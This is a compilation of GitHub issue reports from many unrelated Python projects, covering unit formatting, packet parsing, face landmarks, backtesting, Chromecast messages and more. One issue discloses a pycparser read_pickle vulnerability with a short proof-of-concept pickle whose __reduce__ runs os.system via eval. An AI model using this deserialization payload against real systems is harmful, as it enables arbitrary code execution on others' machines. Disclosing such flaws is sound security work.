issue_title: Pint unit notation violates ISO 80000:1
issue_body:
[ISO 80000-1](https://en.wikipedia.org/wiki/ISO_80000-1), section 7.2.2, notes:

> A solidus (/) shall not be followed by a multiplication sign or a division sign on the same line unless parentheses are inserted to avoid any ambiguity. In complicated cases, negative powers or a horizontal bar may be used.

However, pint gives:

```
In [5]: "{:~}".format(ureg.Quantity(1, ureg.W*ureg.m**-2*ureg.sr**-1*ureg.Hz**-1))
Out[5]: '1 W / Hz / m ** 2 / sr'
```

which explicitly violates the prohibition as outset in ISO 80000-1.  The correct notation would be:

W Hz⁻¹ m⁻² sr⁻¹

Or, if we must stick to ASCII:

W Hz**-1 m**-2 sr**-1

issue_title: Exception raised when calling ureg.<unit>.dimensionality - performance issue
issue_body: When trying to check the dimensionality of an item in the unit registry, e.g. ureg.m.dimensionality it causes Quantity's def dimensionality(self) to be called which in turn calls return self.\_dimensionality and then Quantity's def \_\_getattr\_\_(self, item). This code end up raising the exception: raise AttributeError("Neither Quantity object nor its magnitude ({0})" "has attribute '{1}'".format(self._magnitude, item)) There seems to be two issues with that: a) \_\_getattr\_\_ never tries to check if \_dimensionality actually exists in self (Quantity) so the exception is raised and dealt with in the previous level. b) The exception raising code converts the magnitude from array to string and this causes this to be very slow (for long arrays). In one particular calculation that we do 10 iterations of it were taking 101 seconds, and by just changing the exception code to be raise AttributeError("Neither Quantity object nor its magnitude has the specified attribute") reduced the total time to 4 seconds.

issue_body:
_From [rayvince...@gmail.com](https://code.google.com/u/106040178569529017526/) on October 15, 2009 07:37:26_

What steps will reproduce the problem? 1. use dpkt.pcap.Reader to read a pcap file
2. use dpkt.pcap.Writer to write it in a new file What is the expected output? What do you see instead? The expected output is a positive microsecond number instead a negative
number is stored. What version of the product are you using? On what operating system? Latest stable version of dpkt, on Ubuntu 9.04 Please provide any additional information below. Small issue. It can be easily fixed by interchanging the two numbers. 
Instead of

use        tv_usec=int((float(ts) - int(ts)) * 1000000.0);

_Original issue: http://code.google.com/p/dpkt/issues/detail?id=26_

issue_title: We're not doing 802.1q and 802.1ad correctly in ethernet.py
issue_body:
Currently in ethernet.py if a packet has an 802.1q header we replace the outer ethertype with the one from the 802.1q header. This happens at ethernet.py line 89. This should not happen.

Also, 802.1ad (commonly called QinQ, or Virtual Metro Area Networks(VMAN)) is not done by stacking 0x8100 ethertypes. Cisco recommends 0x9100 or 0x9100 in its QinQ docs[1]. I think it is rather weak on Cisco's part that they recommend this, as they should be adhering to 802.1ad, but whatever. The 802.1ad standard says to use 0x88a8.[2] It can theoretically be anything, which is of course a problem, but I think we can do better. 

The code in ethernet.py lines 85-93 takes none of this into account and instead assumes a stacking of ethertypes 0x8100, which I doubt anyone is actually doing. Because it would mean any intermediate switch wouldn't know if a frame is single or double tagged.

I'm fine developing the code for all this, but before I propose any PR I want to get the opinion of the devs on this. Because I suspect there is a reason for the current behavior.

I'm assuming for now that dpkt will never support 802.1ah, which would be a serious pain. Luckily I think it's mostly been obviated by Nortel's death and the rise of VPLS.

[1] https://www.cisco.com/c/en/us/td/docs/routers/10000/10008/feature/guides/qinq.html
[2] https://en.wikipedia.org/wiki/IEEE_802.1ad

issue_title: Immortal processes
issue_body:
Hi, thanks for the nice tool. I found something that (I believe) is an issue (or just my ignorance).

I use a small wrapper around the `starmap()` function inside a handler for `SIGALRM`.

The wrapper looks like this:

``` python

def execute_parallel(callback, callback_args, workers=4):
    """
    Docstring...
    """
    if not isinstance(callback_args, collections.Iterable):
        raise Exception(EXIT_NOT_ITERABLE)

    pool = Pool(processes=workers)
    return starmap(callback, callback_args, pool=pool)
    
```

and the handler is set up as follows:

``` python

def do_stuff(sig, frame):
        # some code that calls execute_parallel()
        # and collects the result

    signal.signal(signal.SIGALRM, do_stuff)
    signal.setitimer(signal.ITIMER_REAL, 0.1, interval)

```

The problem is that although my wrapper actually returns the desired result, none of the processes created for the handler ever get killed. Those processes are created infinitely in my case, which is a problem (memory, etc.), so I sort of fixed this by adding a .`terminate()` call on the pool (see below). But I'm not sure it's cool.

``` python
def execute_parallel(callback, callback_args, workers=4):
    """
    Docstring...
    """
    if not isinstance(callback_args, collections.Iterable):
        raise Exception(EXIT_NOT_ITERABLE)

    pool = Pool(processes=workers)
    product = starmap(callback, callback_args, pool=pool)
    pool.terminate()

    return product

```

Maybe it's not an issue at all; sorry then.

issue_title: What is correct infrastructure for the use-case?
issue_body:
We currently scrape approximately 20 sites. 

Each of these 20 sites has an average of 1000 to 10000 pages that we scrape, parse and store parsed results to elasticsearch with the TTL age of 10 to 30 minutes.

We would like to be able to scrape all these pages for changes as frequently as possible and discover+scrape+parse+store new pages as soon as they get published on those external websites.

## HARDWARE SERVER SPECS
We tried setting this up with all processes except for actual elasticsearch cluster on a single server with the following specs:
* Linux CentOS 6.x distro with all latest updates
* Python 2.6 / 2.7.9 / 3.4  -- tried them all, have all 3 installed
* 128GB RAM
* Multiple CPUs Intel(R) Xeon(R) CPU E5-2630 v3 @ 2.40GHz - 32 cores total
* RAID1 SSD disk (local) + RAID1 scrape result storage disk (local)
* 1 gigabit dedicated line with guaranteed bandwidth of at least 500mbp/s used specifically for scraping only

RabbitMQ is running on the same server for queue management

## STARTUP COMMAND
We use the following command to fire up pyspider to start all processes (our production environment, please correct me if we're not doing it correctly):
```
/usr/local/bin/python2.7 /usr/local/bin/pyspider -c ./config.json --queue-maxsize 20000 all --processor-num 100 --fetcher-num 37 --result-worker-num 10 --run-in subprocess
```
all pyspider projects are executed @every 3 minutes
age on documents 30 minutes

## CURRENT CUSTOMIZATION
We didn't find any packaged proxy management tools that would allow us to rotate through proxies and and we added a couple of methods that basically load full list of proxies and rotate them on each request for each scraping project so that every request comes from a unique IP address and it won't be reused on the same project until it runs through list of all available proxies

##PROBLEM
By having all of this setup as described above, it appears that we often overload QUEUE and many processes never end up getting picked up and by then second round of crawlers will have re-scraped pages and re-attempt new parsing.

## QUESTIONS
1. The startup command that we use - is it correct to use it this way?
2. Is RabbitMQ resource exhaustive? Web UI console is showing practically no load, and my assumption is that pyspider spends more time on processing / parsing than crawling. Should we move RabbitMQ to separate server/cluster? Would that result in noticeable improvements?
3. Can scheduler be moved out to a separate server? Is it resource intensive on its own or is it low-resource-utilization part of pyspider?
4. Can or should we move any other parts / modules of pySpider to separate servers to see significant improvements?
5. Any other suggestions / recommendations that we should consider in order to optimize and improve scrape/parse speed so that it at least finishes tasks sometimes?
6. Does pySpider have an ability to auto-re-scrape any expired page so that we don't need to re-add it to the queue manually? (currently all our projects originate on home page and will run through all available links, but if the link was removed from the website - we don't have an easy way to track what happened to that page, whether the product that was associated with that page is discontinued/no longer available or not since we no longer get updates on the page that is no longer found via pages that we scrape in the init scripts)?



Thank you very much for all your help and suggestions

issue_title: full_object_detection.rects is not the bounding box of the points
issue_body:
The Python documentation (http://dlib.net/python/index.html#dlib.full_object_detection) states that the `.rect` attribute of a `full_object_detection` object is the bounding box of all the parts.

In practise, however, it just inherits the rectangle from the detected face:

    >>> faces[1]
    rectangle(1993,525,2080,611)
    >>> landmarks.rect
    rectangle(1993,525,2080,611)
    >>> arr = np.array([[p.x, p.y] for p in landmarks.parts()])
    >>> arr
    array([[1997,  553],
           [1997,  562],
           [1998,  572],
           < -- Concatenated for readability .. >       
           [2034,  591],
           [2030,  591],
           [2027,  591]])
    >>> np.min(arr, 0)
    array([1997,  536])
    >>> np.min(arr, 0)
    array([2085,  613])

In this case, the rectangle is `(1993, 525, 2080, 611)` when it should be `(1997, 536, 2085, 613)`.

If this is the intended behaviour, I recommend you change the documentation so that it is clear how the `.rect` rectangle is calculated.

issue_title: convert_dlib_nets_to_caffe
issue_body:
I've noticed a problem with convert_dlib_nets_to_caffe/main.cpp. I have a deep network that uses a max_pool layer with a padding of 1 (a kernel of 3 and a stride of 2). When I try to encode an image with the converted network in caffe I get a (significantly) different encoding compared to encoding the image with dlib.

I see that you have to convert between how caffe and dlib handle padding in compute_caffe_padding_size_for_pooling_layer(). For my network, this function sets the padding at 0 so that the output sizes are consistent. However, this results in a max_pool layer that pools over different sets of pixels. (I know that in this case it is only a single pixel shift, but surprisingly this has a significant impact on the final encoding.)

I was able to fix this by leaving the padding at 1 and inserting a Crop layer after the max_pool layer (and fixing the top pointers, etc.) to set the output size back to the shape expected by dlib.

I'm not sure if this would work in general, but perhaps compute_caffe_padding_size_for_pooling_layer() should print a warning if pad != padding.

issue_title: DLIB_ISO_CPP_ONLY is broken
Add new status for `interior_combine()` failure
issue_body:
Currently when `surface_intersection.f90::interior_combine` exceeds `MAX_EDGES`, it [sets the status][1] to `UNKNOWN`, but a new status code should be added here.

A test case was added in 35ab5d5a7d3518fda1ce4478dacee50bc3e56d9c that actually triggers this code path (the real cause is not the geometry of the intersection, but rather numerical instability producing "duplicate" intersection points between edges).

Since it's "easy" to trigger this code path, a ~~more~~ descriptive status should be used.

[1]: https://github.com/dhermes/bezier/blob/2ba92a65f44227e86a37d577f6c86fd38e700c1c/src/bezier/surface_intersection.f90#L1313-L1315

issue_title: Add explicit MIT License to source dist
issue_body:
Hey-lo,

I'm building a version of `tempora` using [`conda`](http://conda.pydata.org/) for [conda-forge](http://conda-forge.github.io/). When possible, we try to include a link to the license file in the `meta.yaml` specification for the build; doing so requires an actual license file be bundled with the build and (usually) that said license be indexed in an explicit [`MANIFEST.in`](https://docs.python.org/2/distutils/sourcedist.html#manifest-related-options) file so that it gets included in the source distribution.

Would you consider adding a full copy of the MIT License to the bundle, along with an appropriate manifest?

issue_title: Commission Handling in Strategy
issue_body:
I've update to the latest pip version (2.1) and run the  example code below which is taken from  #82:

```python
# Simple single asset potfolio rebalancing to 100% once per month
data = bt.get('aapl', start='2016-01-01', end='2016-03-31')
dates = [pd.to_datetime(dte) for dte in ['2016-01-04', '2016-01-29', '2016-02-29']]
weights = pd.DataFrame([1., 1., 1.], index=dates, columns=data.columns)

strategy = bt.Strategy('example', [bt.algos.RunOnDate(*dates),
                                   bt.algos.WeighTarget(weights),
                                   bt.algos.Rebalance()])                         
                                   
bt_gross = bt.Backtest(strategy, data, integer_positions=False,
                       commissions=lambda q, p: 0, name='gross')
bt_net = bt.Backtest(strategy, data, integer_positions=False,
                     commissions=lambda q, p: abs(q) * p * 0.33, name='net')

result = bt.run(bt_gross, bt_net)
df_merge = bt.merge(result.get_transactions('gross'), result.get_transactions('net'))    
```

The transaction log has updated as expected to reflect new updates (thank you!).  Guess hard to be 100% invested even with integer_positions=False because you have the flexibility of the user defined commission function.

The plot() method indicates that the performance of both the gross and the net is identical.

![figure_1](https://cloud.githubusercontent.com/assets/11697247/23095845/0233b0aa-f609-11e6-87d8-b00e3a7e4ef8.png)

I would expect the net to drop by approximately 24.8% immediately to reflect the negative impact of the traction costs.  If I look at result.backtests['net'].strategy.prices the data is there and looks good. 

```python
df = bt.merge(result.backtests['gross'].strategy.prices, result.backtests['net'].strategy.prices)
df.iloc[0] = 100
```
![figure_1-1](https://cloud.githubusercontent.com/assets/11697247/23095964/4deb66bc-f60b-11e6-9e59-2641cf3668c3.png)

If I run results.stats() the stats are identical for both strategies too.

Thanks,

Tim

issue_title: "find a tor" for client-side "tor:" endpoints
issue_body:
If a user currently uses a "tor:" client-side endpoint, it currently just tries 9050 and 9150 as SOCKS endpoints. This isn't sufficient, nor particularly safe.

What it should do instead is something like the server-side ("onion:") endpoints, and do the following:

1. if get_global_tor ever got called, use that tor we launched (adding a SOCKS port if needed)
2. try connecting to 9151 as a control-port (and ask for the SOCKS port(s))
3. try connecting to 9051 as a control port (ask for SOCKS ports)
4. call get_global_tor() ourselves, thus launching one.

issue_title: kalman filter P update
issue_body:
in file kalman_filter.py, line 174-176, you implemented the following ...
174         # P = (I-KH)P(I-KH)' + KRK'
175         I_KH = self._I - dot(K, H)
176         self._P = dot3(I_KH, P, I_KH.T) + dot3(K, R, K.T)

this is mathematically correct, yet line 176 could be further reduced to ...
self._P = dot(I_KH, P)

because (cf. Simon's book p128, eq 5.16)
P = (I-KH)P(I-KH)' + KRK' = (I-KH)P

issue_title: Repeated Struct typedef generates an error
read_pickle method is vulnerable
issue_body:
from pycparser.ply.yacc import LRTable
import pickle
class joel_test(object):
    def __reduce__(self):
        return eval, ("os.system('calc.exe')",)
test = joel_test()
f=open('joel_test','wb')
pickle.dump(test,f)
f.close()
joel=LRTable()
joel.read_pickle('joel_test')

Hi, there is a vulnerability in read_pickle method in yacc.py, please see PoC above. It can execute arbitrary python commands resulting in command execution.

issue_title: Delorean.shift does not take datetime.timezone.utc
issue_body:
To reproduce:

```python
import delorean
import datetime

utc = datetime.timezone.utc
dt = datetime.datetime(2017, 3, 5, 3, 1, 46, 425154, tzinfo=utc)

d = delorean.Delorean(dt).shift(utc)
```

[From these lines](https://github.com/myusuf3/delorean/blob/10cc1ed91619cb529efae0ed2e9679f90303c90f/delorean/dates.py#L483-L486), Delorean doesn't support anything outside of `pytz.timezone` ability to parse, which breaks on `zone.upper()` [at the beginning of this method](https://github.com/stub42/pytz/blob/7b5e9dc015252d3650ec086118b20fedacef0def/src/pytz/__init__.py#L126-L165).

Should I always use `"UTC"` instead of datetime's provided `datetime.timezone.utc`?  I was hoping to reuse the standard library's version across different datetime libraries.

issue_title: Handling of packet storm does not work well
issue_body:
pyroute2 from today's github master (dc8aa5b), Python 3.5.

I have a daemon that reacts to appearance and disappearance of certain routes by opening IPDB and registering a callback. Normally, rate of routing updates is quite low and everything works perfectly, I can perform the necessary actions within fraction of a second from the routing change. But once in a while, network topology changes and I get a few thousand netlink events within a second or two, and then it's all quiet again.

This situation breaks IPDB: right from the first event, callback gets called about once a second. The rest of the time, the system is idle (my master thread just runs `while not sleep(9999): pass` after registering the callback). Obviously, waiting hours for the routing updates to be acted upon is unacceptable.

I would expect whatever processing slowdown was introduced in response to the packet storm to be lifted ASAP if no new events have arrived in, say, a second, but apparently it is (semi?) permanent.

Even better if the user could be notified about the storm: in my case it would be actually better to shut down IPDB instance, wait a second or two, and start processing from scratch. Reading a few thousand entries from the kernel table is much faster than processing a few thousand events in any case.

There is also a reproducible crash if I add many routes and then remove them, I'll open a separate ticket for that.

`NetlinkError` from the package's root (`from pyroute2 import NetlinkError`) is uncatchable because it returns a `abc.proxy` object which does not inherit from BaseException.

Steps to Reproduce:

```python
from pyroute2 import NetlinkError
```

```
NetlinkError                              Traceback (most recent call last)
```

issue_title: don't show duplicated tags as strings '[x, x]'
issue_body:
sometimes tags in mpd protocol can be duplicates of one another.
This esp. happens if one tagged his library using beets.

This is how raw protocol serves those tags:
```
currentsong
file: ogg/Brandi Carlile/2008 Creep Live/01-Creep.ogg
Last-Modified: 2015-04-30T02:18:24Z
Album: Creep Live
Title: Creep
Track: 1
Artist: Brandi Carlile
Date: 2008
AlbumArtist: Brandi Carlile
Genre: Rock
Track: 1
Time: 273
Pos: 13
Id: 181945
OK
```

in python-mpd2 the 2 "track" values will be represented as one string value:
```
>>> print(file['track'])
[1, 1]
>>> type(file['track'])
<class 'str'>
```
python-mpd2 could check for key:value on parsing and if multi-values for one key are identical simply merge them. Otherwise represent them as a list.

Alternatively represent *all* duplicate tags as lists, even if all values are identical. Personally I prefer the first option :)

issue_title: Web app not working correctly behind HTTPS nginx reverse proxy
issue_body:
#### Description

I followed the instructions here for setting up a reverse proxy for glances: https://github.com/nicolargo/glances/wiki/Reverse-proxy-to-the-Glances-Web-UI

I actually have 2 nginx servers involved here: 
1.  public, internet-facing server with HTTPS and authentication services (oauth2_proxy). It proxies requests to the following server over a VPN:
2. private, internal server which proxies multiple localhost web apps, including glances. It does not use HTTPS. This is where the config from the wiki was applied.

In the Chrome web console, I can see that all resources (css, js, etc) are blocked because they are being requested over HTTP while the root page was requested over HTTPS. It seems that HTTP is hard-coded somehow in the web app for glances, but I don't see where or how to change that from a quick search through the code. I also could not figure out how to rewrite the protocol in nginx, though the public nginx server has a global HTTP->HTTPS redirect (301) rule in place.
#### Versions
- Glances (glances -V): Glances v2.6.2 with psutil v3.1.1
- PSutil (glances -V): Glances v2.6.2 with psutil v3.1.1
- Operating System (lsb_release -a): Ubuntu 14.04.4 LTS

issue_title: Which year is implied when given just a month and day? Next and last?
issue_body:
There may have already been a discussion about this but I was a bit curious about how the year should be determined when given only a month and a day. This may be an interesting discussion topic for all users even if you're not familiar with the code.

For instance, let's say that today, June 12, 2015 I make a reference to June 10. I'm probably talking about two days ago but parsedatetime assumes I'm looking ahead to 2016.

### Current behavior

Given the source date **June 12, 2015**, parsedatetime will produce the following dates when parsing the text shown in gray:
* `June 11`: June 11, 2016
* `June 12`: June 12, 2015
* `June 13`: June 13, 2015
* `next June 11`: June 11, 2017
* `next June 12`: June 12, 2016
* `next June 13`: June 13, 2016
* `last June 11`: June 11, 2015
* `last June 12`: June 12, 2014
* `last June 13`: June 13, 2014

The logic considers the 365±1 day period beginning today to be my frame of reference. It's not *wrong* since the behavior can be documented and understood easily, but it may not be expected.

### What is expected?

Given the source date **June 12, 2015**, I think that the following would be expected:
* `June 11`: June 11, 2015
* `June 12`: June 12, 2015
* `June 13`: June 13, 2015
* `next June 11`: June 11, 2016
* `next June 12`: June 12, 2016
* `next June 13`: June 13, 2016
* `last June 11`: June 11, 2014
* `last June 12`: June 12, 2014
* `last June 13`: June 13, 2014

This logic considers the current Jan 1–Dec 31 period to be my frame of reference. "Next" means the date is in the upcoming year, "last" means the date is in the preceding year, and the omission of both suggests that the date is in the current year.

#### End of the year

The example above is oversimplified as it considers only today, tomorrow, and yesterday. I don't think it's necessarily as simple as requiring "next" to refer to dates in the following year. If today is December 28 and I want to refer to January 4, I would probably not say *next January 4*; it's just a couple days away. 

Any good ideas for how to handle that? For example, if the date is within ±90 days of today then use it regardless of the year, otherwise assume the date is in the current year. I am afraid that crossing over the new year like that would be more error prone and difficult to understand. There is a fine line here between striving for the most likely natural language interpretation and employing logic that is stable and easy to understand.

### Other considerations

* If we agree that the current implementation is unexpected, how much work would it be to change the frame of reference like this?
* Which other phrases would this change affect? For example:
    * `June`: June, 2015 rather than June, 2016
    * `next May`: May, 2016 rather than May, 2017
* Would this badly affect backwards compatibility for your particular use case? This would probably require a major version update.

Right now if we have idf object like a zone, we can access it's fields by 

    zone.Name
    zone.Construction_Name
    
In `ipython`, `ipython notebook` or `jupyter notebook`, you would expect to be able type

and the rest of the field name is filled in (in ipython)

This does not happen.

How to fix it:

- override `__dir__` so that it returns all the fields

issue_title: Wrong module guess for click event with multiple volume blocks
issue_body:
I have defined two volume blocks for two different pulse devices. When defining click events, clicking on either block runs the onClick action of the first module.

The configuration looks like this:
```
volume master {
    device = "pulse:0"
    on_click 1 = "exec pavucontrol"
nus"
}

volume slave {
    device = "pulse:1"
}
```

Log when running py3status with this configuration and clicking on the first block:
```
Jan 29 18:13:13 genius /py3status[24905]: received event {'y': 7, 'instance': 'pulse:0.Master.0', 'x': 1061, 'name': 'volume', 'button': 1}
Jan 29 18:13:13 genius /py3status[24905]: trying to dispatch event to module "volume master"
```

Clicking on the second block does not dispatch the event to the second module ```volume slave```, but again to the first one ```volume master```:
```
Jan 29 18:13:37 genius /py3status[24905]: received event {'y': 12, 'instance': 'pulse:1.Master.0', 'x': 1108, 'name': 'volume', 'button': 1}
Jan 29 18:13:37 genius /py3status[24905]: trying to dispatch event to module "volume master"
```

The instance in the reply does not correspond to the descriptor ```master/slave```, but is a concatenation of the ```device```, ```mixer``` and ```mixer_id```. [The guessing method for the module](https://github.com/ultrabug/py3status/blob/master/py3status/__init__.py#L806) takes this into account but relies on the presence of all three configuration parameters. If any of the three parameter is not set, the guessing will not work correctly. Instead, the check should just ignore unset parameters and get the closest match for device, mixer, and then mixer_id.

As a **workaround**, define all three configuration parameters explicitly:
```
volume slave {
    device = "pulse:1"
    mixer = "master"
    mixer_id = "0"
}
```

issue_title: SoundFile objects logically evaluate to False
issue_body:
I noticed that SoundFile objects always evaluate to False. For example:

```
wf = sf.SoundFile('input.wav')
if wf:
    print("cool wav file man!")
    # never executed
else:
    print("no wav file...not cool.")
```

I don't know where this is coming from, I think by default classes inheriting from `object` will evaluate to True. Is this intended behavior? It's often convenient to rely on the object logically evaluating to True; for one thing builtin file objects evaluate to True so I would expect this behavior from SoundFile as well. Would you be alright with adding a __bool__ method to return True?

issue_title: Calling GetSleepTime earlier in loops
issue_body:
`GetSleepTime` is used in many `GetX()` methods to avoid rate limiting

    while True:
        # Call the API and do stuff with the results
        # [...]
        sec = self.GetSleepTime('/API_URL')
        time.sleep(sec)

Yet, if the limit has been reached before and still not reseted, the first pass in the loop will raise a rate-limit error.

Wouldn't it be better to have this test at the beginning of the loop to make sure the exception is not raised?

    while True:
        sec = self.GetSleepTime('/API_URL')
        time.sleep(sec)
        # Call the API and do stuff with the results
        # [...]

issue_title: cannot import keyring.py27compat.unicode_str
issue_body:
Apparently they renamed `keyring.py27compat.unicode_str` to `text_type`, cf. [keyring github page](https://github.com/jaraco/keyring/commit/af31b7e9b8bd13a622ddd395f8023fd1b2db59a3).

I had a script using keyrings.alt that stopped working two days ago, after changing `unicode_str` to `text_type` in keyrings.alt.Gnome it works again.

issue_title: Support for better rendering of parameterized tests
issue_body:
I'm currently using parameterized tests like here:
http://docs.pytest.org/en/latest/parametrize.html

Example:
```python
import pytest

@pytest.mark.parametrize("name,version", [
    ("ansible", "2.1.0.0"),
    ("git", "2.7.4"),
    ("python", "2.7.11"),
    ("python-pip", "8.1.1"),
    ("meld", "3.14.2"),
    ("vim", "7.4.1689"),
])
def test_package_is_intalled_at_version(Package, name, version):
    assert Package(name).is_installed
    assert version in Package(name).version
```

The resulting output with pytest-spec looks like this:
```
spec/test_tool_versions.py
    [PASS]  Package is intalled at version[local-ansible-2.1.0.0]
    [PASS]  Package is intalled at version[local-git-2.7.4]
    [PASS]  Package is intalled at version[local-python-2.7.11]
    [PASS]  Package is intalled at version[local-python-pip-8.1.1]
    [PASS]  Package is intalled at version[local-meld-3.14.2]
    [PASS]  Package is intalled at version[local-vim-7.4.1689]
```

Any ideas how we could render the parameters more nicely?

Eg. by formatting the test name to include the params:
```python
def test_package_NAME_is_intalled_at_version_VERSION(Package, name, version):
    assert Package(name).is_installed
    assert version in Package(name).version
```

To produce something like:
```
spec/test_tool_versions.py
    [PASS]  Package "ansible" is intalled at version "2.1.0.0"[local]
    [PASS]  Package "git" is intalled at version "2.7.4"[local]
    [PASS]  Package "python" is intalled at version "2.7.11"[local]
    [PASS]  Package "pyhon-pip" is intalled at version "8.1.1"[local]
    [PASS]  Package "meld" is intalled at version "3.14.2"[local]
    [PASS]  Package "vim" is intalled at version "7.4.1689"[local]
```

What do you think?

issue_title: fluorescence spectra in files for RSM3D
issue_body:
* From: "Zhang, Zhan" <ZhanZhang@anl.gov>
* Date: 6/12/18 3:09 PM (GMT-06:00)
* To: "Jemian, Pete R." <jemian@anl.gov>, "Hammonds, John P." <jphammonds@anl.gov> (@JPHammonds )
* Subject: Reading spec file in RSM3D

Hi Pete & John,

Last week we have a user doing sort of a powder scan.  When I tried to analyze the data with RSM3D, I was surprised to saw an error message.  It took me a while to realize that the reason was that I have fluorescence spectrum saved within the spec file (ESRF standard?) with a ‘@’ leading the line and breaking the whole spectrum (2048 channels) into 64 lines of 32 numbers. 

Pymca handles that properly, of course.  I did not realize that the reader we are using in RSM3D consider that an ‘incomplete’ scan and could not index the scan numbers properly as soon as such data appears in a data file.  Could that capability be included? 

Thanks!

Zhan

issue_body:
Crash when receiving non-json:

When running Home-Assistant
```
16-10-05 19:03:34 DEBUG (Thread-16) [pychromecast.socket_client] Sending: Message urn:x-cast:com.google.cast.media from sender-0 to web-2: {'requestId': 3, 'type': 'GET_STATUS'}
Exception in thread Thread-16:
Traceback (most recent call last):
  File "/usr/lib/python3.5/threading.py", line 914, in _bootstrap_inner
    self.run()
  File "/home/ee/home-assistant/lib/python3.5/site-packages/pychromecast/socket_client.py", line 358, in run
    data = _json_from_message(message)
  File "/home/ee/home-assistant/lib/python3.5/site-packages/pychromecast/socket_client.py", line 81, in _json_from_message
    return json.loads(message.payload_utf8)
  File "/usr/lib/python3.5/json/__init__.py", line 319, in loads
    return _default_decoder.decode(s)
  File "/usr/lib/python3.5/json/decoder.py", line 339, in decode
    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
  File "/usr/lib/python3.5/json/decoder.py", line 357, in raw_decode
    raise JSONDecodeError("Expecting value", s, err.value) from None
json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)

```

When running interactively in ipython and after adding some debug printout, it turns out this is the message causing the failure:
```

import pychromecast
pychromecast.get_chromecasts()
...
...
...
Raw data received:
b'\x08\x00\x12\x05web-2\x1a\x01*""urn:x-cast:com.hbonordic.subtitles(\x002\x05ready'

Parsed message received
message protocol_version: CASTV2_1_0
source_id: "web-2"
destination_id: "*"
namespace: "urn:x-cast:com.hbonordic.subtitles"
payload_type: STRING
payload_utf8: "ready"
```

The payload_utf8 consisting of the string "`ready`" will then be passed into `json.loads` in `_json_from_message` causing it to fail.

Maybe the call to `_json_from_message` inside `SocketClient.run` should be protected by `try...catch` to avoid the polling loop to die because of invalid json?

issue_title: Maybe bring glob and fnmatch options into alignment
issue_body:
Current defaults for glob and fnmatch vary quite a bit.  Maybe make them align more for less confusion.  If this was done, it would be as a major release.

Originally the idea was to match Python's fnmatch, which is why the defaults for that are off by default.  Then when developing the glob portion, we decided to use the existing test suite from minimatch (which models bash behavior).  It was easiest to just use their defaults which enables a number of the "extra" features by default.  In retrospect a more consistent behavior may make more sense.

The question is, what does consistent mean?  Do we disable more features in glob by default? Do we enable more features in fnmatch by default.  I don't think this should affect wcmatch though, but we'll see.

issue_title: False positives
issue_body:
Hi!

Try analyzing this program:
```python
import threading
import logging

logging.basicConfig(level=logging.DEBUG,
                    format='(%(threadName)-10s) %(message)s',
                    )

class MyThread(threading.Thread):
    def run(self):
        logging.debug('running')
        return

for i in range(5):
    t = MyThread()
    t.start()
```

Current output from `vulture` 0.29:
```
thread.py:10: unused function 'run' (60% confidence)
thread.py:17: unused attribute 'daemon' (60% confidence)
```

Expected output:
Nothing.

The `run()` function is what the thread executes when started: https://docs.python.org/3.7/library/threading.html#threading.Thread.run

The `daemon` attribute is used for telling the thread what flavor it should be: https://docs.python.org/3.7/library/threading.html#threading.Thread.daemon

Is there any way for Vulture to figure these things out by itself so that it doesn't present these false positive warnings?

issue_title: When validating a sub-schema against possible schemas, the error messages are not correct
issue_body:
Say you have something like this:

```
import voluptuous as v
s = v.Schema([v.Any({v.Required('a'): 3}, {v.Required('b'):4})])
```

this means that you expect a list of elements, each element can either be a dictionary with key 'a' and value 3, or a dictionary with key 'b' and value 4.

The validation works:

```
>>> s = v.Schema([v.Any({v.Required('a'): 3}, {v.Required('b'):4})])
>>> s([{'a':3}])
[{'a': 3}]
>>> s([{'b':4}])
[{'b': 4}]
```

however when you violate it the message you get does not make sense:
```
>>> s([{'b':3}])
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/home/mprager/.virtualenv/validator/lib/python2.7/site-packages/voluptuous/schema_builder.py", line 192, in __call__
    return self._compiled([], data)
  File "/home/mprager/.virtualenv/validator/lib/python2.7/site-packages/voluptuous/schema_builder.py", line 523, in validate_sequence
    cval = validate(index_path, value)
  File "/home/mprager/.virtualenv/validator/lib/python2.7/site-packages/voluptuous/schema_builder.py", line 625, in validate_callable
    return schema(data)
  File "/home/mprager/.virtualenv/validator/lib/python2.7/site-packages/voluptuous/validators.py", line 230, in __call__
    raise error if self.msg is None else AnyInvalid(self.msg)
voluptuous.error.MultipleInvalid: extra keys not allowed @ data[0]['b']
```

The message should read like:
```
voluptuous.error.MultipleInvalid: not a valid value for dictionary value @ data[0]['b']
```

For more complex validation, this makes it hard for the user to know what exactly is wrong with the schema.

issue_title: Evaluating other features
issue_body:
This is just a place where I can jot notes on other regular expression features.

1. One thing to note, if Re and Regex were to ever use `\C` or `\c`, we'd have to drop the lower case and upper case property shorthand of `\l`, `\c`, `\L`, and `\C` in searches.  Since we have things like `[[:upper:]]` or `\p{Lu}` etc., I don't see this as a problem.  There are two regular expression features that if added could break this though, but I don't particularly care about either one of those features.  But it should be noted that they *could* be added in Re or Regex regardless of how I "feel" about them.

    The question is, do we drop this shorthand of `l` and `c`?  We can't really use `\u` due to how Python uses `\u`  PCRE variants usually specify Unicode as `\u{...}` which would make this possible, but just isn't the case in Python.  I like the shorthand, but I am not going to fight for the shorthand.  I think this got borrowed from boost?

    Anyways, this is a real question to consider.

- `\cK` etc.  I personally don't care about this.  I'd rather just specify the bytes.  I don't see `regex` adding it has he's had plenty of time to do so, mentions that regex has enough features, and I just don't see the big usefulness of this.

- `\C` allows grabbing a "unit".  So in UTF16 mode it grab 16 bits etc.  I feel this is another feature I don't particularly care about.  I don't see us having modes in Python regex to change unit types, but you never know.

- `\k` not practical for us to add to Re.  It would have to be added by the engine itself, so this is off the table.  This is supported in Regex though.

- `\v` and `\V`.  Python uses `\v` for vertical tabs. That is built into strings, so I don't see a reason to override that logic. Since Python regex is in raw strings you **could** have it, but I'd have to see Re make that step first, and if it did, it would make adding this ourselves moot.

- `\h` and `H`.  If we aren't providing a references for vertical whitespace, it would be weird to add one for horizontal whitespace.  So this would be a pass as well.

- Possibly other things...

issue_title: Futures still alive when an exception is thrown
issue_body:
Hi,

I've been using requests-futures for some months now, and it's really a great tool.

However, for a few days, I've been looking more closely to the number of process started by a Session.

When a future finishes normally, with no timeOut exception or anything like that, the future is freed from the memory, and the process affiliated with the future disappears. When an exception is thrown, the process stays alive.

I tried many things, like session.executor.shutdown(), but I couldn't fix the issue. It seems that when an exception is raised, the future is still "marked" as pending.

Do you have an idea about how to solve this issue ?

issue_title: BUG? sleep_and_retry only retries once
issue_body:
